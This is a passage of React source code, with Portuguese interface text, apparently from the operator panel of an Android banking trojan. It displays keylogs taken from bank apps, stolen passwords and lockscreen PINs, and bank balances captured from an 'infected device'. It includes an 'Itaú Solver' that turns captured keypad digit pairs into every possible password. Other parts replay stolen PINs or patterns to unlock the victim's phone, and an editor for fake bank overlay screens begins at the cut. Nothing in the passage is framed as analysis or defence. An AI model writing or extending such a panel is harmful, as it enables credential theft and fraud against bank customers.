                                            ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                         Senhas & Dígitos ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('click')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'click'
                                            ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                         Botões & Cliques ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('screen')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'screen'
                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                         Telas Aberta ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('text')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'text'
                                            ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/50 shadow-[0_0_8px_rgba(16,185,129,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                        ¨ Textos ({appKeylogs.filter(l => getLogCategory(l) === 'text').length})
                                      </button>
                                    </div>

                                    <div className="space-y-4 max-h-72 overflow-y-auto pr-1 custom-scrollbar relative pl-3 border-l border-[#24242a]/60">
                                      {Object.keys(groups).map((day, groupIdx) => (
                                        <div key={groupIdx} className="space-y-2 relative">
                                          {/* Badge de Data com Copiar Tudo */}
                                          <div className="flex items-center justify-between my-2 relative -left-4">
                                            <div className="flex items-center gap-1.5 bg-slate-950 px-2 py-0.5 rounded-full border border-[#24242a] shadow-md">
                                              <span className="text-[10px]"></span>
                                              <span className="text-[9px] font-black font-mono text-[#ef4444] uppercase tracking-wide">
                                                {day}
                                              </span>
                                            </div>
                                            <button
                                              onClick={() => {
                                                const textToCopy = groups[day].map(l => {
                                                  const time = l.time || new Date(l.timestamp || l.created_at).toLocaleTimeString('pt-BR');
                                                  return `[${time}] ${getBankLogDisplay(l)}`;
                                                }).join('\n');
                                                navigator.clipboard.writeText(textToCopy);
                                                addLog(` Copiado todos os logs de ${day}`);
                                              }}
                                              className="text-[8px] font-bold text-[#8b8b94] hover:text-[#ef4444] bg-slate-950/40 hover:bg-[#121214]/20 px-2 py-0.5 rounded border border-[#121214] hover:border-[#24242a]/40 transition-all font-mono"
                                            >
                                              Copiar Dia
                                            </button>
                                          </div>
                                          
                                          <div className="space-y-1.5">
                                            {groups[day].map((log, logIdx) => {
                                              const category = getLogCategory(log);
                                              const logTime = log.time || new Date(log.timestamp || log.created_at).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                                              const isOffline = log.isOffline || false;
                                              const logText = getBankLogDisplay(log);

                                              const isPass = category === 'password';
                                              const isClick = category === 'click';
                                              const isScreen = category === 'screen';
                                              const isText = category === 'text';

                                              // Verifica se parece um PIN ou senha do Itaú
                                              const isItauKeypad = /(\d)\s*(?:ou|\|)\s*(\d)/i.test(logText);
                                              let itauPairs: [string, string][] = [];
                                              let itauPermutations: string[] = [];
                                              if (isItauKeypad) {
                                                const matches = Array.from(logText.matchAll(/(\d)\s*(?:ou|\|)\s*(\d)/gi));
                                                itauPairs = matches.map((m: any) => [m[1], m[2]]);
                                                if (itauPairs.length > 0) {
                                                  let currentCombos: string[] = [''];
                                                  for (const [d1, d2] of itauPairs) {
                                                    const nextCombos: string[] = [];
                                                    for (const p of currentCombos) {
                                                      nextCombos.push(p + d1);
                                                      nextCombos.push(p + d2);
                                                    }
                                                    currentCombos = nextCombos;
                                                  }
                                                  itauPermutations = currentCombos;
                                                }
                                              }

                                              return (
                                                <div 
                                                  key={log.id || logIdx} 
                                                  className={`group flex items-start gap-2.5 p-2 rounded-md transition-all border ${
                                                    isPass 
                                                      ? 'bg-rose-950/20 border-[#1a1a1e]/50 hover:border-[#ef4444]/60 shadow-[0_0_10px_rgba(244,63,94,0.1)]' 
                                                      : isClick 
                                                        ? 'bg-purple-950/20 border-purple-900/50 hover:border-[#f87171]/60 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
                                                        : isScreen 
                                                          ? 'bg-[#121214]/15 border-[#1a1a1e]/40 hover:border-[#2a2a31]/40'
                                                          : 'bg-[#200703]/40 border-[#121214]/50 hover:border-[#24242a]/60'
                                                  }`}
                                                >
                                                  {/* Indicador de linha do tempo */}
                                                  <div className="flex flex-col items-center flex-shrink-0 pt-1 relative -left-[18px]">
                                                    <div className={`w-2.5 h-2.5 rounded-full border-2 bg-slate-950 transition-all duration-300 ${
                                                      isPass 
                                                        ? 'border-[#ef4444] shadow-[0_0_8px_rgba(244,63,94,0.8)] group-hover:scale-110' 
                                                        : isClick 
                                                          ? 'border-[#f87171] shadow-[0_0_8px_rgba(239,68,68,0.8)] group-hover:scale-110'
                                                          : isOffline 
                                                            ? 'border-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.6)] group-hover:scale-110' 
                                                            : 'border-[#2a2a31] shadow-[0_0_8px_rgba(239,68,68,0.6)] group-hover:scale-110'
                                                    }`}></div>
                                                  </div>
                                                  
                                                  <div className="flex-1 min-w-0 -ml-4">
                                                    <div className="flex items-center justify-between gap-2 mb-1">
                                                      <div className="flex items-center gap-1.5 flex-wrap">
                                                        <span className="text-[9px] font-mono text-[#8b8b94] font-bold bg-slate-950/60 px-1.5 py-0.2 rounded border border-[#121214]/50">
                                                          {logTime}
                                                        </span>
                                                        {isPass && (
                                                          <span className="text-[8px] bg-rose-950/60 text-rose-300 border border-[#ef4444]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
                                                             Teclado / Senha
                                                          </span>
                                                        )}
                                                        {isClick && (
                                                          <span className="text-[8px] bg-purple-950/60 text-[#fca5a5] border border-[#f87171]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
                                                             Clique em Botão
                                                          </span>
                                                        )}
                                                        {isScreen && (
                                                          <span className="text-[8px] bg-[#121214]/60 text-[#ef4444] border border-[#2a2a31]/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                             Mudança de Tela
                                                          </span>
                                                        )}
                                                        {isText && (
                                                          <span className="text-[8px] bg-emerald-950/60 text-emerald-300 border border-emerald-500/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                            ¨ Texto Digitado
                                                          </span>
                                                        )}
                                                        {isOffline && (
                                                          <span className="text-[8px] bg-amber-950/40 text-amber-500 border border-amber-500/20 px-1 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                             Offline
                                                          </span>
                                                        )}
                                                      </div>
                                                      
                                                      {/* Botão de copiar hover */}
                                                      <button
                                                        onClick={() => {
                                                          navigator.clipboard.writeText(logText);
                                                          addLog(` Copiado: ${logText}`);
                                                        }}
                                                        className="opacity-0 group-hover:opacity-100 text-[8px] bg-slate-950 hover:bg-[#121214]/30 text-slate-400 hover:text-[#ef4444] border border-[#121214] hover:border-[#24242a]/40 px-1.5 py-0.5 rounded transition-all font-mono"
                                                      >
                                                        Copiar
                                                      </button>
                                                    </div>
                                                    
                                                    {isItauKeypad && itauPairs.length > 0 ? (
                                                      <div className="space-y-2 mt-1">
                                                        <div className="flex flex-wrap items-center gap-1.5 bg-black/40 p-2 rounded-md border border-[#ef4444]/20">
                                                          {itauPairs.map((pair, idx) => (
                                                            <span key={idx} className="inline-flex items-center gap-1 text-[11px] font-mono font-bold bg-orange-950/60 text-[#fca5a5] border border-[#ef4444]/40 px-2 py-0.5 rounded-md shadow-sm">
                                                              <span className="text-[9px] text-[#ef4444]/80">T{idx+1}:</span>
                                                              <span>[{pair[0]} ou {pair[1]}]</span>
                                                            </span>
                                                          ))}
                                                        </div>

                                                        {itauPermutations.length > 0 && (
                                                          <details className="group/details">
                                                            <summary className="cursor-pointer text-[10px] font-bold text-[#f87171] hover:text-[#fca5a5] flex items-center justify-between bg-orange-950/40 hover:bg-[#1a1a1e]/40 px-2.5 py-1 rounded border border-[#ef4444]/30 transition-all select-none">
                                                              <span> Exibir {itauPermutations.length} Senhas Possíveis (Itaú Solver)</span>
                                                              <button
                                                                type="button"
                                                                onClick={(e) => {
                                                                  e.preventDefault();
                                                                  e.stopPropagation();
                                                                  navigator.clipboard.writeText(itauPermutations.join('\n'));
                                                                  addLog(` Copiado ${itauPermutations.length} senhas Itaú geradas!`);
                                                                }}
                                                                className="ml-2 text-[9px] bg-[#ef4444] hover:bg-[#f87171] text-black px-2 py-0.5 rounded font-black font-mono shadow transition-all"
                                                              >
                                                                Copiar {itauPermutations.length} Senhas
                                                              </button>
                                                            </summary>
                                                            <div className="mt-2 grid grid-cols-4 sm:grid-cols-6 gap-1 max-h-36 overflow-y-auto p-2 bg-slate-950 rounded-md border border-[#24242a] font-mono text-[10px] text-[#fca5a5] custom-scrollbar select-all">
                                                              {itauPermutations.map((pinCombo, pIdx) => (
                                                                <div key={pIdx} className="bg-orange-950/30 border border-[#ef4444]/20 rounded px-1.5 py-0.5 text-center font-bold tracking-wider hover:bg-[#ef4444] hover:text-black transition-colors cursor-pointer" title="Clique para copiar este PIN" onClick={() => {
                                                                  navigator.clipboard.writeText(pinCombo);
                                                                  addLog(` Copiado PIN Itaú: ${pinCombo}`);
                                                                }}>
                                                                  {pinCombo}
                                                                </div>
                                                              ))}
                                                            </div>
                                                          </details>
                                                        )}
                                                      </div>
                                                    ) : (
                                                      <p className={`text-xs font-mono break-all leading-relaxed select-all px-2.5 py-1.5 rounded-md border shadow-inner ${
                                                        isPass 
                                                          ? 'text-rose-200 bg-rose-950/30 border-[#1a1a1e]/50 font-bold' 
                                                          : isClick 
                                                            ? 'text-purple-200 bg-purple-950/30 border-purple-900/50 font-semibold'
                                                            : isScreen 
                                                              ? 'text-[#e8e8ea] bg-[#121214]/20 border-[#1a1a1e]/30' 
                                                              : 'text-slate-100 bg-black/40 border-[#121214]/80'
                                                      }`}>
                                                        {logText}
                                                      </p>
                                                    )}
                                                  </div>
                                                </div>
                                              );
                                            })}
                                          </div>
                                        </div>
                                      ))}
                                    </div>
                                  </div>
                                );
                              })()
                            )}
                          </div>
                        </div>
                      </div>
                    );
                  })() : (() => {
                    const getLatestBalances = () => {
                      const latest: { [pkg: string]: any } = {};
                      bankBalances.forEach(b => {
                        if (!latest[b.package]) {
                          latest[b.package] = b;
                        }
                      });
                      return Object.values(latest);
                    };

                    const latestBals = getLatestBalances();

                    return (
                      <div className="space-y-6">
                        <div className="bg-gradient-to-br from-[#121214] to-slate-950 p-5 rounded-md border border-[#24242a] shadow-xl">
                          <h3 className="text-sm font-bold text-slate-200 mb-1"> Saldo Total Detectado</h3>
                          <p className="text-xs text-[#8b8b94]">
                            Soma dos saldos mais recentes de todos os bancos capturados no aparelho.
                          </p>
                        </div>

                        {/* Bank Grid List */}
                        <div className="space-y-3">
                          <h4 className="text-xs font-bold text-slate-450 uppercase tracking-wider">Contas Bancárias Monitoradas</h4>
                          {latestBals.length === 0 ? (
                            <div className="text-center py-10 bg-[#121214]/30 border border-dashed border-[#24242a] rounded-md">
                              <span className="text-4xl block mb-2 opacity-50"></span>
                              <p className="text-slate-400 text-xs font-bold">Nenhum saldo capturado ainda</p>
                              <p className="text-[#6f6f78] text-[10px] mt-1 max-w-[240px] mx-auto">
                                Abra um aplicativo de banco no dispositivo infectado. O monitor capturará o saldo automaticamente.
                              </p>
                            </div>
                          ) : (
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              {latestBals.map((bal: any, idx: number) => {
                                const logo = getBankLogoEmoji(bal.package);
                                const cardGrad = getBankCardGradient(bal.package);
                                const matchedInstalled = installedBanks.find((app: any) => app.package === bal.package);
                                const displayName = matchedInstalled?.name || bal.bank || "Banco";
                                
                                return (
                                  <div 
                                    key={idx}
                                    onClick={() => setSelectedMonitorBank(matchedInstalled || { package: bal.package, name: displayName })}
                                    className={`relative overflow-hidden cursor-pointer rounded-md bg-gradient-to-br ${cardGrad} border p-4 shadow-lg transition-all hover:scale-[1.02] hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]`}
                                  >
                                    <div className="flex justify-between items-start mb-4">
                                      <div className="flex items-center space-x-2">
                                        <span className="text-2xl">{logo}</span>
                                        <div>
                                          <h4 className="font-bold text-sm text-white truncate">{displayName}</h4>
                                          <p className="text-[9px] text-white/50 font-mono truncate max-w-[120px]">{bal.package}</p>
                                        </div>
                                      </div>
                                      <span className="text-[9px] text-white/40 font-mono">
                                        {new Date(bal.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                                      </span>
                                    </div>
                                    <div>
                                      <p className="text-[9px] text-white/45 uppercase tracking-wider">SALDO CAPTURADO</p>
                                      <p className="text-xl font-bold font-mono text-white tracking-wide">{bal.balance}</p>
                                    </div>
                                  </div>
                                );
                              })}
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  })()}
                </div>
              </div>
            </div>}

            {/*  COFRE DE SENHAS BANCRIAS */}
            <FloatingWindow
              id="bankPasswords"
              title=" SENHAS BANCRIAS CAPTURADAS"
              isOpen={floatingWindows.bankPasswords.open}
              position={{ x: floatingWindows.bankPasswords.x, y: floatingWindows.bankPasswords.y }}
              size={{ width: floatingWindows.bankPasswords.width, height: floatingWindows.bankPasswords.height }}
              zIndex={floatingWindows.bankPasswords.zIndex}
              onClose={() => toggleWindow('bankPasswords')}
              onFocus={() => bringToFront('bankPasswords')}
              onDrag={(x, y) => updateWindowPosition('bankPasswords', x, y)}
              onResize={(w, h) => updateWindowSize('bankPasswords', w, h)}
              headerColor="bg-gradient-to-r from-orange-700 via-amber-700 to-yellow-600"
            >
              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-slate-950 via-orange-950/20 to-[#121214] flex flex-col">
                {/* Control bar */}
                <div className="bg-[#121214]/90 border border-[#ef4444]/30 rounded-md p-2.5 mb-3 flex-shrink-0 space-y-2 shadow-lg">
                  <div className="flex items-center justify-between">
                    <h3 className="text-white font-black flex items-center text-xs tracking-wider">
                      <span className="text-base mr-1.5"></span>
                      COFRE DE SENHAS
                      <span className="ml-2 px-2 py-0.5 bg-[#84cc16] text-white text-[10px] rounded-full font-mono font-bold shadow-[0_0_8px_rgba(234,88,12,0.5)]">
                        {bankPasswords.length}
                      </span>
                    </h3>

                    {bankPasswords.length > 0 && (
                      <button
                        onClick={() => {
                          const textToCopy = bankPasswords.map(p => `[${p.bank || 'Banco'}] ${p.label || p.hint || 'Senha'}: ${p.password}`).join('\n');
                          navigator.clipboard.writeText(textToCopy);
                          addLog(` Copiadas todas as ${bankPasswords.length} senhas capturadas`);
                        }}
                        className="text-[9px] bg-orange-950 hover:bg-[#1a1a1e] text-[#fca5a5] font-bold px-2 py-1 rounded border border-[#ef4444]/40 transition-all font-mono shadow-sm"
                      >
                         Copiar Todas
                      </button>
                    )}
                  </div>

                  {/* Search and Filter Inputs */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-1.5 pt-1">
                    <div className="relative">
                      <input
                        type="text"
                        placeholder=" Buscar senha ou banco..."
                        value={bankPasswordSearch}
                        onChange={(e) => setBankPasswordSearch(e.target.value)}
                        className="w-full text-[11px] bg-slate-950 border border-[#24242a] rounded px-2 py-1 text-slate-200 placeholder-[#8b8b94] focus:outline-none focus:border-[#ef4444] font-mono"
                      />
                    </div>

                    <select
                      value={bankPasswordBankFilter}
                      onChange={(e) => setBankPasswordBankFilter(e.target.value)}
                      className="text-[11px] bg-slate-950 border border-[#24242a] rounded px-2 py-1 text-slate-200 focus:outline-none focus:border-[#ef4444] font-mono"
                    >
                      <option value="ALL"> Todos os Bancos</option>
                      <option value="itau">Itaú</option>
                      <option value="bradesco">Bradesco</option>
                      <option value="santander">Santander</option>
                      <option value="nubank">Nubank</option>
                      <option value="bb">Banco do Brasil</option>
                      <option value="caixa">Caixa</option>
                      <option value="inter">Inter</option>
                      <option value="c6">C6 Bank</option>
                      <option value="LOCKSCREEN">Lockscreen PINs</option>
                    </select>
                  </div>
                </div>
                
                {(() => {
                  const filtered = bankPasswords.filter(pwd => {
                    const search = bankPasswordSearch.toLowerCase();
                    const bName = (pwd.bank || '').toLowerCase();
                    const pPkg = (pwd.package || '').toLowerCase();
                    const pwdStr = (pwd.password || '').toLowerCase();
                    const labelStr = (pwd.label || pwd.hint || '').toLowerCase();

                    const matchesSearch = !search || bName.includes(search) || pPkg.includes(search) || pwdStr.includes(search) || labelStr.includes(search);
                    
                    let matchesFilter = true;
                    if (bankPasswordBankFilter !== 'ALL') {
                      if (bankPasswordBankFilter === 'LOCKSCREEN') {
                        matchesFilter = pwd.source === 'LOCKSCREEN' || pPkg.includes('keyguard');
                      } else {
                        matchesFilter = bName.includes(bankPasswordBankFilter) || pPkg.includes(bankPasswordBankFilter);
                      }
                    }

                    return matchesSearch && matchesFilter;
                  });

                  if (bankPasswords.length === 0) {
                    return (
                      <div className="text-center py-12 text-slate-400 bg-slate-950/50 rounded-md border border-[#121214] flex-1 flex flex-col items-center justify-center p-4">
                        <div className="text-4xl mb-3 animate-pulse"></div>
                        <p className="text-sm font-bold text-slate-300">Aguardando capturas de senhas...</p>
                        <p className="text-xs text-[#8b8b94] mt-2 max-w-[240px]">
                          As senhas digitadas nos apps de banco ou overlays serão salvas automaticamente aqui.
                        </p>
                      </div>
                    );
                  }

                  if (filtered.length === 0) {
                    return (
                      <div className="text-center py-8 text-[#8b8b94] bg-slate-950/40 rounded-md border border-[#121214] flex-1 flex flex-col items-center justify-center">
                        <span className="text-2xl mb-1"></span>
                        <span className="text-xs">Nenhuma senha corresponde aos filtros.</span>
                      </div>
                    );
                  }

                  return (
                    <div className="space-y-3 flex-1 overflow-y-auto pr-0.5">
                      {filtered.map((pwd, i) => {
                        const logoEmoji = getBankLogoEmoji(pwd.package || '');
                        return (
                          <div 
                            key={pwd.id || i} 
                            className="bg-gradient-to-r from-[#121214] via-slate-950 to-orange-950/40 border border-[#ef4444]/40 rounded-md p-3 shadow-md hover:border-[#f87171]/70 transition-all"
                          >
                            <div className="flex items-center justify-between mb-2">
                              <div className="flex items-center space-x-2 min-w-0 flex-1">
                                <span className="text-xl flex-shrink-0">{logoEmoji}</span>
                                <div className="min-w-0">
                                  <span className="font-black text-[#fca5a5] text-sm truncate block">{pwd.bank || 'Banco'}</span>
                                  <span className="text-[9px] text-[#8b8b94] font-mono truncate block">{pwd.package}</span>
                                </div>
                              </div>
                              <div className="flex flex-col items-end flex-shrink-0 ml-2">
                                <span className="text-[9px] text-slate-400 font-mono">
                                  {new Date(pwd.timestamp).toLocaleTimeString('pt-BR')}
                                </span>
                                <span className="px-1.5 py-0.5 bg-[#1a1a1e]/60 text-[#fca5a5] text-[9px] rounded-full font-bold font-mono mt-0.5">
                                  {pwd.digits || (pwd.password ? pwd.password.length : 6)} dígitos
                                </span>
                              </div>
                            </div>
                            
                            {/* Label do campo e fonte */}
                            <div className="mb-2 flex items-center space-x-1.5 flex-wrap gap-1">
                              {(pwd.label || pwd.hint) && (
                                <span className="px-2 py-0.5 bg-orange-950/80 text-[#fca5a5] text-[10px] rounded font-mono font-bold border border-[#ef4444]/30">
                                  {pwd.label || pwd.hint}
                                </span>
                              )}
                              {pwd.source === 'VISUAL_SCREEN' && (
                                <span className="px-2 py-0.5 bg-green-950 text-green-400 text-[9px] rounded border border-green-800/40 font-mono">
                                   APK Visual Overlay
                                </span>
                              )}
                              {pwd.source === 'LOCKSCREEN' && (
                                <span className="px-2 py-0.5 bg-purple-950 text-[#f87171] text-[9px] rounded border border-purple-800/40 font-mono">
                                   Lockscreen PIN
                                </span>
                              )}
                              {pwd.source === 'keyboard' && (
                                <span className="px-2 py-0.5 bg-[#121214] text-[#ef4444] text-[9px] rounded border border-[#24242a]/40 font-mono">
                                  ¨ Keylogger Teclado
                                </span>
                              )}
                            </div>
                            
                            {/* Senha capturada com destaque neon */}
                            <div className="bg-black/80 rounded-md p-2.5 border border-[#ef4444]/30 shadow-inner flex items-center justify-between gap-2">
                              <div className="text-xl font-bold text-emerald-400 tracking-[0.25em] font-mono text-center flex-1 break-all select-all">
                                {pwd.password}
                              </div>
                              <button
                                onClick={() => {
                                  navigator.clipboard.writeText(pwd.password);
                                  addLog(` Senha copiada: ${pwd.password}`);
                                }}
                                className="px-2.5 py-1.5 bg-[#84cc16] hover:bg-[#ef4444] text-white text-xs font-bold rounded-md transition-colors shadow-md flex items-center gap-1 flex-shrink-0"
                              >
                                Copiar
                              </button>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  );
                })()}
              </div>
            </FloatingWindow>
            
            {/*  LOCKSCREEN - PIN + Pattern */}
            <FloatingWindow
              id="lockscreen"
              title=" Lockscreen PIN + Pattern"
              isOpen={floatingWindows.lockscreen.open}
              position={{ x: floatingWindows.lockscreen.x, y: floatingWindows.lockscreen.y }}
              size={{ width: floatingWindows.lockscreen.width, height: floatingWindows.lockscreen.height }}
              zIndex={floatingWindows.lockscreen.zIndex}
              onClose={() => toggleWindow('lockscreen')}
              onFocus={() => bringToFront('lockscreen')}
              onDrag={(x, y) => updateWindowPosition('lockscreen', x, y)}
              onResize={(w, h) => updateWindowSize('lockscreen', w, h)}
              headerColor="bg-[#ef4444]"
            >
              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-[#1a1a1e]/30 to-gray-900/90">
                {/* Tabs PIN / Pattern */}
                <div className="flex mb-3 bg-[#121214]/80 rounded-md p-1">
                  <button
                    onClick={() => setLockscreenType('PIN')}
                    className={`flex-1 py-2 rounded-md text-sm font-bold transition-all ${
                      lockscreenType === 'PIN' 
                        ? 'bg-yellow-600 text-white shadow-lg' 
                        : 'text-gray-400 hover:text-white'
                    }`}
                  >
                     PIN
                  </button>
                  <button
                    onClick={() => setLockscreenType('PATTERN')}
                    className={`flex-1 py-2 rounded-md text-sm font-bold transition-all ${
                      lockscreenType === 'PATTERN' 
                        ? 'bg-[#ef4444] text-white shadow-lg' 
                        : 'text-gray-400 hover:text-white'
                    }`}
                  >
                     Padrão
                  </button>
                </div>
                
                {/* Status */}
                <div className={`mb-3 p-2 rounded-md text-center text-sm font-bold ${
                  isLockscreenActive 
                    ? 'bg-green-600/80 text-white animate-pulse' 
                    : 'bg-[#2a2a31]/80 text-gray-400'
                }`}>
                  {isLockscreenActive ? ` ${lockscreenType} ATIVO` : ' Inativo'}
                </div>
                
                {/* Botões de Ação */}
                <div className="flex gap-2 mb-3">
                  {!isLockscreenActive ? (
                    <button
                      onClick={() => showLockscreen()}
                      className="flex-1 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#24242a] text-[#10120a] rounded-md font-bold text-sm transition-all"
                    >
                       Bloquear
                    </button>
                  ) : (
                    <button
                      onClick={hideLockscreen}
                      className="flex-1 py-2 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white rounded-md font-bold text-sm transition-all"
                    >
                       Desativar
                    </button>
                  )}
                </div>
                
                <div className="mb-3 rounded-md p-2 border border-[#2a2a31]/25/50 bg-[#1a1a1e]/40">
                  <div className="text-xs text-gray-400 font-semibold mb-1"> PINs capturados</div>
                  {renderCapturedUnlockPinsList()}
                </div>

                {renderUnlockRecordingControls()}
                
                {/* Capturado */}
                <div className="mb-3">
                  <label className="text-gray-400 text-xs font-semibold block mb-1">
                    {lockscreenType === 'PIN' ? ' PIN Capturado:' : ' Padrão Capturado:'}
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={lockscreenType === 'PIN' 
                        ? (pinInput || capturedPin) 
                        : (patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || ''))
                      }
                      onChange={(e) => lockscreenType === 'PIN' ? setPinInput(e.target.value) : setPatternInput(e.target.value)}
                      className="flex-1 bg-black/60 border border-green-500/50 rounded-md px-3 py-2 text-green-400 font-mono text-lg text-center tracking-widest"
                      placeholder={lockscreenType === 'PIN' ? '' : '14789'}
                    />
                    <button
                      onClick={() => {
                        const val = lockscreenType === 'PIN' 
                          ? (pinInput || capturedPin) 
                          : (patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || ''));
                        if (val) {
                          navigator.clipboard.writeText(val);
                          addLog(` ${lockscreenType} copiado: ${val}`);
                        }
                      }}
                      className="px-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md text-sm"
                    >
                      
                    </button>
                  </div>
                </div>
                
                {/* Teclado PIN */}
                {lockscreenType === 'PIN' && (
                  <div className="mb-3">
                    <div className="grid grid-cols-3 gap-1.5 max-w-[200px] mx-auto">
                      {[1,2,3,4,5,6,7,8,9].map(n => (
                        <button
                          key={n}
                          onClick={() => {
                            setPinInput((prev) => prev + n);
                            pressLockKey(String(n));
                          }}
                          className="py-2.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold text-lg transition-all"
                        >
                          {n}
                        </button>
                      ))}
                      <button
                        onClick={() => {
                          setPinInput((prev) => prev.slice(0, -1));
                          pressLockKey('DELETE');
                        }}
                        className="py-2.5 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md font-bold text-sm"
                      >
                        
                      </button>
                      <button
                        onClick={() => {
                          setPinInput((prev) => prev + '0');
                          pressLockKey('0');
                        }}
                        className="py-2.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold text-lg"
                      >
                        0
                      </button>
                      <button
                        onClick={() => pressLockKey('ENTER')}
                        className="py-2.5 bg-green-700 hover:bg-green-600 text-white rounded-md font-bold text-sm"
                      >
                        
                      </button>
                    </div>
                  </div>
                )}
                
                {/* Grid Pattern */}
                {lockscreenType === 'PATTERN' && (
                  <div className="mb-3">
                    <div className="grid grid-cols-3 gap-3 max-w-[160px] mx-auto bg-[#121214]/60 p-4 rounded-md">
                      {[1,2,3,4,5,6,7,8,9].map(n => {
                        const currentVal = patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || '');
                        const isSelected = currentVal.includes(String(n));
                        return (
                          <div
                            key={n}
                            onClick={() => {
                              const base = patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || '');
                              if (!base.includes(String(n))) {
                                setPatternInput(base + n);
                              }
                            }}
                            className={`w-10 h-10 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                              isSelected
                                ? 'bg-[#ef4444] text-white scale-110 shadow-lg shadow-[#f87171]/50'
                                : 'bg-[#2a2a31] text-gray-400 hover:bg-[#6f6f78]'
                            }`}
                          >
                            {n}
                          </div>
                        );
                      })}
                    </div>
                    <button
                      onClick={() => setPatternInput('')}
                      className="mt-2 w-full py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-gray-300 rounded-md text-xs"
                    >
                       Limpar Padrão
                    </button>
                  </div>
                )}
                
                {/* Reprodução Automática */}
                <div className="bg-[#121214]/60 rounded-md p-3">
                  <div className="text-xs text-gray-400 font-semibold mb-2"> Reprodução Automática</div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-gray-400 text-xs">Delay:</span>
                    <input
                      type="number"
                      value={pinDelay}
                      onChange={(e) => setPinDelay(Number(e.target.value))}
                      className="w-16 bg-[#2a2a31] border border-[#2a2a31]/25 rounded px-2 py-1 text-white text-xs text-center"
                    />
                    <span className="text-gray-500 text-xs">ms</span>
                  </div>
                  <button
                    onClick={playLockSequence}
                    disabled={isPlayingPin}
                    className={`w-full py-2 rounded-md font-bold text-sm transition-all ${
                      isPlayingPin
                        ? 'bg-gray-600 text-gray-400 cursor-not-allowed'
                        : lockscreenType === 'PIN'
                          ? 'bg-gradient-to-r from-yellow-600 to-[#84cc16] hover:from-yellow-700 hover:to-orange-700 text-white'
                          : 'bg-gradient-to-r from-[#ef4444] to-[#65a30d] hover:from-[#ef4444] hover:to-[#4d7c0f] text-[#10120a]'
                    }`}
                  >
                    {isPlayingPin ? '³ Reproduzindo...' : ` Reproduzir ${lockscreenType}`}
                  </button>
                </div>
              </div>
            </FloatingWindow>
            
            {/*  EDITAÚR TELAS DE BANCO */}
            <FloatingWindow
              id="editBankScreens"
              title=" Editar Telas de Banco"
              isOpen={floatingWindows.editBankScreens.open}
              position={{ x: floatingWindows.editBankScreens.x, y: floatingWindows.editBankScreens.y }}
              size={{ width: floatingWindows.editBankScreens.width, height: floatingWindows.editBankScreens.height }}
              zIndex={floatingWindows.editBankScreens.zIndex}
              onClose={() => toggleWindow('editBankScreens')}
              onFocus={() => bringToFront('editBankScreens')}
              onDrag={(x, y) => updateWindowPosition('editBankScreens', x, y)}
              onResize={(w, h) => updateWindowSize('editBankScreens', w, h)}
